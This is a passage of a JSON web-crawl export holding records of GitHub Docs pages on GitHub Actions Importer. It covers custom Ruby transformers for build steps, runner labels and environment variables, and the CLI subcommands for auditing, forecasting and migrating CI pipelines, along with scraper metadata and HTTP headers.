      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "1A4A:2C6BB9:1B969:22984:681C51CC",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:12 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686413.517164, VS0, VE401",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "30007",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Extending GitHub Actions Importer with custom transformers\nGitHub Actions Importer offers the ability to extend its built-in mapping.\nLegal notice\nAbout custom transformers\nGitHub Actions Importer offers the ability to extend its built-in mapping by creating custom transformers. Custom transformers can be used to:\nConvert items that GitHub Actions Importer does not automatically convert, or modify how items are converted. For more information, see Creating custom transformers for items.\nConvert references to runners to use different runner labels. For more information, see Creating custom transformers for runners.\nConvert environment variable values from your existing pipelines to GitHub Actions workflows. For more information, see Creating custom transformers for environment variables.\nUsing custom transformers with GitHub Actions Importer\nA custom transformer contains mapping logic that GitHub Actions Importer can use to transform your plugins, tasks, runner labels, or environment variables to work with GitHub Actions. Custom transformers are written with a domain-specific language (DSL) built on top of Ruby, and are defined within a file with the .rb file extension.\nYou can use the --custom-transformers CLI option to specify which custom transformer files to use with the audit, dry-run, and migrate commands.\nFor example, if custom transformers are defined in a file named transformers.rb, you can use the following command to use them with GitHub Actions Importer:\ngh actions-importer ... --custom-transformers transformers.rb \nAlternatively, you can use the glob pattern syntax to specify multiple custom transformer files. For example, if multiple custom transformer files are within a directory named transformers, you can provide them all to GitHub Actions Importer with the following command:\ngh actions-importer ... --custom-transformers transformers/*.rb \nNote\nWhen you use custom transformers, the custom transformer files must reside in the same directory, or in subdirectories, from where the gh actions-importer command is run.\nCreating custom transformers for items\nYou can create custom transformers that GitHub Actions Importer will use when converting existing build steps or triggers to their equivalent in GitHub Actions. This is especially useful when:\nGitHub Actions Importer doesn't automatically convert an item.\nYou want to change how an item is converted by GitHub Actions Importer.\nYour existing pipelines use custom or proprietary extensions, such as shared libraries in Jenkins, and you need to define how these steps should function in GitHub Actions.\nGitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. In order to create custom transformers for build steps and triggers:\nEach custom transformer file must contain at least one transform method.\nEach transform method must return a Hash, an array of Hash's, or nil. This returned value will correspond to an action defined in YAML. For more information about actions, see Understanding GitHub Actions.\nExample custom transformer for a build step\nThe following example converts a build step that uses the \"buildJavaScriptApp\" identifier to run various npm commands:\nRuby\ntransform \"buildJavaScriptApp\" do |item| command = [\"build\", \"package\", \"deploy\"].map do |script| \"npm run #{script}\" end { name: \"build javascript app\", run: command.join(\"\\n\") } end \nThe above example results in the following GitHub Actions workflow step. It is comprised of converted build steps that had a buildJavaScriptApp identifier:\n- name: build javascript app run: | npm run build npm run package npm run deploy \nThe transform method uses the identifier of the build step from your source CI/CD instance in an argument. In this example, the identifier is buildJavaScriptLibrary. You can also use comma-separated values to pass multiple identifiers to the transform method. For example, transform \"buildJavaScriptApp\", \"buildTypeScriptApp\" { |item| ... }.\nNote\nThe data structure of item will be different depending on the CI/CD platform and the type of item being converted.\nCreating custom transformers for runners\nYou can customize the mapping between runners in your source CI/CD instance and their equivalent GitHub Actions runners.\nGitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. To create custom transformers for runners:\nThe custom transformer file must have at least one runner method.\nThe runner method accepts two parameters. The first parameter is the source CI/CD instance's runner label, and the second parameter is the corresponding GitHub Actions runner label. For more information on GitHub Actions runners, see Using GitHub-hosted runners.\nExample custom transformers for runners\nThe following example shows a runner method that converts one runner label to one GitHub Actions runner label in the resulting workflow.\nRuby\nrunner \"linux\", \"ubuntu-latest\" \nYou can also use the runner method to convert one runner label to multiple GitHub Actions runner labels in the resulting workflow.\nRuby\nrunner \"big-agent\", [\"self-hosted\", \"xl\", \"linux\"] \nGitHub Actions Importer attempts to map the runner label as best it can. In cases where it cannot do this, the ubuntu-latest runner label is used as a default. You can use a special keyword with the runner method to control this default value. For example, the following custom transformer instructs GitHub Actions Importer to use macos-latest as the default runner instead of ubuntu-latest.\nRuby\nrunner :default, \"macos-latest\" \nCreating custom transformers for environment variables\nYou can customize the mapping between environment variables in your source CI/CD pipelines to their values in GitHub Actions.\nGitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. To create custom transformers for environment variables:\nThe custom transformer file must have at least one env method.\nThe env method accepts two parameters. The first parameter is the name of the environment variable in the original pipeline, and the second parameter is the updated value for the environment variable for GitHub Actions. For more information about GitHub Actions environment variables, see Store information in variables.\nExample custom transformers for environment variables\nThere are several ways you can set up custom transformers to map your environment variables.\nThe following example sets the value of any existing environment variables named OCTO, to CAT when transforming a pipeline.\nYou can also remove all instances of a specific environment variable so they are not transformed to an GitHub Actions workflow. The following example removes all environment variables with the name MONA_LISA.\nYou can also map your existing environment variables to secrets. For example, the following env method maps an environment variable named MONALISA to a secret named OCTOCAT.\nRuby\nenv \"MONALISA\", secret(\"OCTOCAT\") \nThis will set up a reference to a secret named OCTOCAT in the transformed workflow. For the secret to work, you will need to create the secret in your GitHub repository. For more information, see Using secrets in GitHub Actions.\nYou can also use regular expressions to update the values of multiple environment variables at once. For example, the following custom transformer removes all environment variables from the converted workflow:\nThe following example uses a regular expression match group to transform environment variable values to dynamically generated secrets.\nRuby\nenv /^(.+)_SSH_KEY/, secret(\"%s_SSH_KEY) \nNote\nThe order in which env methods are defined matters when using regular expressions. The first env transformer that matches an environment variable name takes precedence over subsequent env methods. You should define your most specific environment variable transformers first.\nLegal notice\nPortions have been adapted from https://github.com/github/gh-actions-importer/ under the MIT license:\nMIT License Copyright (c) 2022 GitHub Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-extending-github-actions-importer--xf9xl.html",
  "markdown": "# Extending GitHub Actions Importer with custom transformers\n\nGitHub Actions Importer offers the ability to extend its built-in mapping.\n\n[Legal notice](#legal-notice)\n\n## [About custom transformers](#about-custom-transformers)\n\nGitHub Actions Importer offers the ability to extend its built-in mapping by creating custom transformers. Custom transformers can be used to:\n\n*   Convert items that GitHub Actions Importer does not automatically convert, or modify how items are converted. For more information, see [Creating custom transformers for items](#creating-custom-transformers-for-items).\n*   Convert references to runners to use different runner labels. For more information, see [Creating custom transformers for runners](#creating-custom-transformers-for-runners).\n*   Convert environment variable values from your existing pipelines to GitHub Actions workflows. For more information, see [Creating custom transformers for environment variables](#creating-custom-transformers-for-environment-variables).\n\n## [Using custom transformers with GitHub Actions Importer](#using-custom-transformers-with-github-actions-importer)\n\nA custom transformer contains mapping logic that GitHub Actions Importer can use to transform your plugins, tasks, runner labels, or environment variables to work with GitHub Actions. Custom transformers are written with a domain-specific language (DSL) built on top of Ruby, and are defined within a file with the `.rb` file extension.\n\nYou can use the `--custom-transformers` CLI option to specify which custom transformer files to use with the `audit`, `dry-run`, and `migrate` commands.\n\nFor example, if custom transformers are defined in a file named `transformers.rb`, you can use the following command to use them with GitHub Actions Importer:\n\n```\ngh actions-importer ... --custom-transformers transformers.rb\n```\n\nAlternatively, you can use the glob pattern syntax to specify multiple custom transformer files. For example, if multiple custom transformer files are within a directory named `transformers`, you can provide them all to GitHub Actions Importer with the following command:\n\n```\ngh actions-importer ... --custom-transformers transformers/*.rb\n```\n\nNote\n\nWhen you use custom transformers, the custom transformer files must reside in the same directory, or in subdirectories, from where the `gh actions-importer` command is run.\n\n## [Creating custom transformers for items](#creating-custom-transformers-for-items)\n\nYou can create custom transformers that GitHub Actions Importer will use when converting existing build steps or triggers to their equivalent in GitHub Actions. This is especially useful when:\n\n*   GitHub Actions Importer doesn't automatically convert an item.\n*   You want to change how an item is converted by GitHub Actions Importer.\n*   Your existing pipelines use custom or proprietary extensions, such as shared libraries in Jenkins, and you need to define how these steps should function in GitHub Actions.\n\nGitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. In order to create custom transformers for build steps and triggers:\n\n*   Each custom transformer file must contain at least one `transform` method.\n*   Each `transform` method must return a `Hash`, an array of `Hash`'s, or `nil`. This returned value will correspond to an action defined in YAML. For more information about actions, see [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions).\n\n### [Example custom transformer for a build step](#example-custom-transformer-for-a-build-step)\n\nThe following example converts a build step that uses the \"buildJavaScriptApp\" identifier to run various `npm` commands:\n\nRuby\n\n```\ntransform \"buildJavaScriptApp\" do |item|\n  command = [\"build\", \"package\", \"deploy\"].map do |script|\n    \"npm run #{script}\"\n  end\n\n  {\n    name: \"build javascript app\",\n    run: command.join(\"\\n\")\n  }\nend\n```\n\nThe above example results in the following GitHub Actions workflow step. It is comprised of converted build steps that had a `buildJavaScriptApp` identifier:\n\n```\n- name: build javascript app\n  run: |\n    npm run build\n    npm run package\n    npm run deploy\n```\n\nThe `transform` method uses the identifier of the build step from your source CI/CD instance in an argument. In this example, the identifier is `buildJavaScriptLibrary`. You can also use comma-separated values to pass multiple identifiers to the `transform` method. For example, `transform \"buildJavaScriptApp\", \"buildTypeScriptApp\" { |item| ... }`.\n\nNote\n\nThe data structure of `item` will be different depending on the CI/CD platform and the type of item being converted.\n\n## [Creating custom transformers for runners](#creating-custom-transformers-for-runners)\n\nYou can customize the mapping between runners in your source CI/CD instance and their equivalent GitHub Actions runners.\n\nGitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. To create custom transformers for runners:\n\n*   The custom transformer file must have at least one `runner` method.\n*   The `runner` method accepts two parameters. The first parameter is the source CI/CD instance's runner label, and the second parameter is the corresponding GitHub Actions runner label. For more information on GitHub Actions runners, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#supported-runners-and-hardware-resources).\n\n### [Example custom transformers for runners](#example-custom-transformers-for-runners)\n\nThe following example shows a `runner` method that converts one runner label to one GitHub Actions runner label in the resulting workflow.\n\nRuby\n\n```\nrunner \"linux\", \"ubuntu-latest\"\n```\n\nYou can also use the `runner` method to convert one runner label to multiple GitHub Actions runner labels in the resulting workflow.\n\nRuby\n\n```\nrunner \"big-agent\", [\"self-hosted\", \"xl\", \"linux\"]\n```\n\nGitHub Actions Importer attempts to map the runner label as best it can. In cases where it cannot do this, the `ubuntu-latest` runner label is used as a default. You can use a special keyword with the `runner` method to control this default value. For example, the following custom transformer instructs GitHub Actions Importer to use `macos-latest` as the default runner instead of `ubuntu-latest`.\n\nRuby\n\n```\nrunner :default, \"macos-latest\"\n```\n\n## [Creating custom transformers for environment variables](#creating-custom-transformers-for-environment-variables)\n\nYou can customize the mapping between environment variables in your source CI/CD pipelines to their values in GitHub Actions.\n\nGitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. To create custom transformers for environment variables:\n\n*   The custom transformer file must have at least one `env` method.\n*   The `env` method accepts two parameters. The first parameter is the name of the environment variable in the original pipeline, and the second parameter is the updated value for the environment variable for GitHub Actions. For more information about GitHub Actions environment variables, see [Store information in variables](https://docs.github.com/en/actions/learn-github-actions/variables).\n\n### [Example custom transformers for environment variables](#example-custom-transformers-for-environment-variables)\n\nThere are several ways you can set up custom transformers to map your environment variables.\n\n*   The following example sets the value of any existing environment variables named `OCTO`, to `CAT` when transforming a pipeline.\n    \n    You can also remove all instances of a specific environment variable so they are not transformed to an GitHub Actions workflow. The following example removes all environment variables with the name `MONA_LISA`.\n    \n*   You can also map your existing environment variables to secrets. For example, the following `env` method maps an environment variable named `MONALISA` to a secret named `OCTOCAT`.\n    \n    Ruby\n    \n    ```\n    env \"MONALISA\", secret(\"OCTOCAT\")\n    ```\n    \n    This will set up a reference to a secret named `OCTOCAT` in the transformed workflow. For the secret to work, you will need to create the secret in your GitHub repository. For more information, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions#creating-secrets-for-a-repository).\n    \n*   You can also use regular expressions to update the values of multiple environment variables at once. For example, the following custom transformer removes all environment variables from the converted workflow:\n    \n    The following example uses a regular expression match group to transform environment variable values to dynamically generated secrets.\n    \n    Ruby\n    \n    ```\n    env /^(.+)_SSH_KEY/, secret(\"%s_SSH_KEY)\n    ```\n    \n    Note\n    \n    The order in which `env` methods are defined matters when using regular expressions. The first `env` transformer that matches an environment variable name takes precedence over subsequent `env` methods. You should define your most specific environment variable transformers first.\n    \n\n## [Legal notice](#legal-notice)\n\nPortions have been adapted from [https://github.com/github/gh-actions-importer/](https://github.com/github/gh-actions-importer/) under the MIT license:\n\n```\nMIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 251,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-extending-github-actions-importer-",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-extending-github-actions-importer-",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-extending-github-actions-importer-",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-extending-github-actions-importer-",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-extending-github-actions-importer-"
    },
    "lengths": {
      "extractus": 15146,
      "readableText": 13076,
      "none": 40154,
      "readableTextIfPossible": 13076,
      "result": 13076,
      "markdown": 10537
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments",
    "loadedTime": "2025-05-08T06:40:18.425Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments",
    "title": "Managing workflow runs and deployments - GitHub Docs",
    "description": "GitHub enables you to have control over your workflow runs and deployments.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Managing workflow runs and deployments - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "4B37:1CA452:1B8AC:22FA7:681C51CA",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "date": "Thu, 08 May 2025 06:40:11 GMT",
      "via": "1.1 varnish",
      "age": "0",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686411.930777, VS0, VE320",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "23412",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Managing workflow runs and deployments\nGitHub enables you to have control over your workflow runs and deployments.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-1q1wb.html",
  "markdown": "# Managing workflow runs and deployments\n\nGitHub enables you to have control over your workflow runs and deployments.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 240,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-removedElementsHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 0,
      "readableText": 318,
      "none": 27605,
      "readableTextIfPossible": 27605,
      "result": 318,
      "markdown": 117
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer",
    "loadedTime": "2025-05-08T06:40:21.015Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer",
    "title": "Automating migration with GitHub Actions Importer - GitHub Docs",
    "description": "Use GitHub Actions Importer to plan and automate your migration to GitHub Actions.",
    "author": null,
    "keywords": "Migration,CI,CD",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Automating migration with GitHub Actions Importer - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "F538:BF1A2:EA4C40:131B8CD:681C51CD",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:13 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686414.618326, VS0, VE329",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28493",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Automating migration with GitHub Actions Importer\nUse GitHub Actions Importer to plan and automate your migration to GitHub Actions.\nLegal notice\nAbout GitHub Actions Importer\nYou can use GitHub Actions Importer to plan and automatically migrate your CI/CD supported pipelines to GitHub Actions.\nGitHub Actions Importer is distributed as a Docker container, and uses a GitHub CLI extension to interact with the container.\nAny workflow that is converted by the GitHub Actions Importer should be inspected for correctness before using it as a production workload. The goal is to achieve an 80% conversion rate for every workflow, however, the actual conversion rate will depend on the makeup of each individual pipeline that is converted.\nSupported CI platforms\nYou can use GitHub Actions Importer to migrate from the following platforms:\nAzure DevOps\nBamboo\nBitbucket Pipelines\nCircleCI\nGitLab (both cloud and self-hosted)\nJenkins\nTravis CI\nPrerequisites\nGitHub Actions Importer has the following requirements:\nAn environment where you can run Linux-based containers, and can install the necessary tools. \nDocker is installed and running.\nGitHub CLI is installed.\nNote\nThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.\nInstalling the GitHub Actions Importer CLI extension\nInstall the GitHub Actions Importer CLI extension:\nBash\ngh extension install github/gh-actions-importer \nVerify that the extension is installed:\n$ gh actions-importer -h Options: -?, -h, --help Show help and usage information Commands: update Update to the latest version of GitHub Actions Importer. version Display the version of GitHub Actions Importer. configure Start an interactive prompt to configure credentials used to authenticate with your CI server(s). audit Plan your CI/CD migration by analyzing your current CI/CD footprint. forecast Forecast GitHub Actions usage from historical pipeline utilization. dry-run Convert a pipeline to a GitHub Actions workflow and output its yaml file. migrate Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes. \nUpdating the GitHub Actions Importer CLI\nTo ensure you're running the latest version of GitHub Actions Importer, you should regularly run the update command:\ngh actions-importer update \nAuthenticating at the command line\nYou must configure credentials that allow GitHub Actions Importer to communicate with GitHub and your current CI server. You can configure these credentials using environment variables or a .env.local file. The environment variables can be configured in an interactive prompt, by running the following command:\ngh actions-importer configure \nUsing the GitHub Actions Importer CLI\nUse the subcommands of gh actions-importer to begin your migration to GitHub Actions, including audit, forecast, dry-run, and migrate.\nAuditing your existing CI pipelines\nThe audit subcommand can be used to plan your CI/CD migration by analyzing your current CI/CD footprint. This analysis can be used to plan a timeline for migrating to GitHub Actions.\nTo run an audit, use the following command to determine your available options:\n$ gh actions-importer audit -h Description: Plan your CI/CD migration by analyzing your current CI/CD footprint. [...] Commands: azure-devops An audit will output a list of data used in an Azure DevOps instance. bamboo An audit will output a list of data used in a Bamboo instance. circle-ci An audit will output a list of data used in a CircleCI instance. gitlab An audit will output a list of data used in a GitLab instance. jenkins An audit will output a list of data used in a Jenkins instance. travis-ci An audit will output a list of data used in a Travis CI instance. \nForecasting usage\nThe forecast subcommand reviews historical pipeline usage to create a forecast of GitHub Actions usage.\nTo run a forecast, use the following command to determine your available options:\n$ gh actions-importer forecast -h Description: Forecasts GitHub Actions usage from historical pipeline utilization. [...] Commands: azure-devops Forecasts GitHub Actions usage from historical Azure DevOps pipeline utilization. bamboo Forecasts GitHub Actions usage from historical Bamboo pipeline utilization. jenkins Forecasts GitHub Actions usage from historical Jenkins pipeline utilization. gitlab Forecasts GitHub Actions usage from historical GitLab pipeline utilization. circle-ci Forecasts GitHub Actions usage from historical CircleCI pipeline utilization. travis-ci Forecasts GitHub Actions usage from historical Travis CI pipeline utilization. github Forecasts GitHub Actions usage from historical GitHub pipeline utilization. \nTesting the migration process\nThe dry-run subcommand can be used to convert a pipeline to its GitHub Actions equivalent, and then write the workflow to your local filesystem.\nTo perform a dry run, use the following command to determine your available options:\n$ gh actions-importer dry-run -h Description: Convert a pipeline to a GitHub Actions workflow and output its yaml file. [...] Commands: azure-devops Convert an Azure DevOps pipeline to a GitHub Actions workflow and output its yaml file. bamboo Convert a Bamboo pipeline to GitHub Actions workflows and output its yaml file. circle-ci Convert a CircleCI pipeline to GitHub Actions workflows and output the yaml file(s). gitlab Convert a GitLab pipeline to a GitHub Actions workflow and output the yaml file. jenkins Convert a Jenkins job to a GitHub Actions workflow and output its yaml file. travis-ci Convert a Travis CI pipeline to a GitHub Actions workflow and output its yaml file. \nMigrating a pipeline to GitHub Actions\nThe migrate subcommand can be used to convert a pipeline to its GitHub Actions equivalent and then create a pull request with the contents.\nTo run a migration, use the following command to determine your available options:\n$ gh actions-importer migrate -h Description: Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes. [...] Commands: azure-devops Convert an Azure DevOps pipeline to a GitHub Actions workflow and open a pull request with the changes. bamboo Convert a Bamboo pipeline to GitHub Actions workflows and open a pull request with the changes. circle-ci Convert a CircleCI pipeline to GitHub Actions workflows and open a pull request with the changes. gitlab Convert a GitLab pipeline to a 